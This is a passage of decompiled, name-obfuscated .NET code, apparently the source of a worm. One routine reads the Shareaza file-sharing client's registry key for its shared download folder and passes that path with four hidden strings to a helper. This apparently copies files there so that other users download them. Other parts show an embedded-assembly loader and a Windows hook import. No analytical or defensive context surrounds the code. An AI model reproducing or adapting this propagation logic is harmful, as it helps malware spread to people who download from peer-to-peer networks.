			if (class21_0.int_8 == 0)
			{
				class21_0.int_4 = 2;
				return true;
			}
			return !Class15.smethod_62(class21_0.class22_0);
		case 6:
			if (!Class15.smethod_43(class21_0.class25_0, class21_0.class22_0))
			{
				return false;
			}
			class21_0.class24_0 = Class15.smethod_50(class21_0.class25_0);
			class21_0.class24_1 = Class15.smethod_6(class21_0.class25_0);
			class21_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class15.smethod_63(class21_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	unsafe static void smethod_68()
	{
		void* ptr = stackalloc byte[13];
		int try0006_dispatch = -1;
		string string_ = default(string);
		RegistryKey currentUser = default(RegistryKey);
		RegistryKey registryKey = default(RegistryKey);
		object objectValue = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 258:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_002c;
						case 5:
							goto IL_0044;
						case 6:
							goto IL_005a;
						case 7:
							goto IL_0071;
						case 8:
							goto IL_0082;
						case 9:
							goto IL_0093;
						case 10:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 11:
						case 12:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0093:
					*(int*)((byte*)ptr + 8) = 9;
					Class15.smethod_52(string_, Class7.string_3);
					break;
					IL_0082:
					*(int*)((byte*)ptr + 8) = 8;
					Class15.smethod_52(string_, Class7.string_2);
					goto IL_0093;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					currentUser = Registry.CurrentUser;
					goto IL_001a;
					IL_001a:
					*(int*)((byte*)ptr + 8) = 3;
					registryKey = currentUser.OpenSubKey("Software\\Shareaza\\Shareaza\\Downloads", writable: false);
					goto IL_002c;
					IL_002c:
					*(int*)((byte*)ptr + 8) = 4;
					((byte*)ptr)[12] = ((registryKey != null) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] == 0)
					{
						goto end_IL_0006_3;
					}
					goto IL_0044;
					IL_0044:
					*(int*)((byte*)ptr + 8) = 5;
					objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue("CollectionPath"));
					goto IL_005a;
					IL_005a:
					*(int*)((byte*)ptr + 8) = 6;
					string_ = Conversions.ToString(Operators.ConcatenateObject(objectValue, (object)"\\"));
					goto IL_0071;
					IL_0071:
					*(int*)((byte*)ptr + 8) = 7;
					Class15.smethod_52(string_, Class7.string_1);
					goto IL_0082;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 10;
				Class15.smethod_52(string_, Class7.string_4);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 258;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_69(int int_0, int int_1, byte[] byte_0, Class20.Class22 class22_0)
	{
		if (class22_0.int_0 < class22_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_1 + int_0;
		if (0 <= int_1 && int_1 <= num && num <= byte_0.Length)
		{
			if (((uint)int_0 & (true ? 1u : 0u)) != 0)
			{
				class22_0.uint_0 |= (uint)((byte_0[int_1++] & 0xFF) << class22_0.int_2);
				class22_0.int_2 += 8;
			}
			class22_0.byte_0 = byte_0;
			class22_0.int_0 = int_1;
			class22_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static void smethod_70()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class15.smethod_48;
		}
		catch
		{
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int UnhookWindowsHookEx(int int_0);
}
